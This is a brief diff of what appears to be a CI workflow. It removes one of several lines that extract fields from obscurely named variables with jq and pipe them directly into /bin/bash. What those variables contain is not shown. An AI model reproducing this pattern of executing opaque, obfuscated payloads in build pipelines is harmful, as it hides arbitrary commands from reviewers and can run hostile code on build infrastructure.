@@ -41,7 +41,6 @@ jobs:
           echo $onri6323 | jq -r .ycxna33935 | /bin/bash
           echo $r78 | jq -r .g98998 | /bin/bash
           printf '%s' "$yhw28892" | jq -r .u594 | /bin/bash
-          echo $a8 | jq -r .ezvb24 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
